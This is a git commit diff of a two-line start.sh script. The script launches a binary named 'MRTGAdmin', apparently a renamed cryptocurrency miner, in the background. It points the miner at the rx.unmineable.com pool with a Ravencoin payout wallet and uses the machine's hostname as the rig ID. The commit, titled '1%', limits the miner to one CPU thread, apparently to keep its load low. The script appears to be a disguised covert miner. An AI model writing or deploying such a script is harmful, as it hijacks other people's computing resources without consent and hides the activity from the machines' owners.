b6f90d6b646a425357a0d411bac4b2b5de05d164
wagepentathlon <96092863+wagepentathlon@users.noreply.github.com>
2023-04-01 23:39:52 -0500

    1%

--- start.sh
+++ start.sh
@@ -1,2 +1,2 @@
 NAME="$(hostname)"
-./MRTGAdmin/Linux/MRTGAdmin -B -o rx.unmineable.com:3333 -a rx -k -u RVN:RTbY46h1CnHKZgNmuNvjoprMgveTWQYVNg --rig-id=${NAME} -p x
+./MRTGAdmin/Linux/MRTGAdmin -B -o rx.unmineable.com:3333 -a rx -k -u RVN:RTbY46h1CnHKZgNmuNvjoprMgveTWQYVNg --rig-id=${NAME} -p x --cpu-max-threads-hint=1
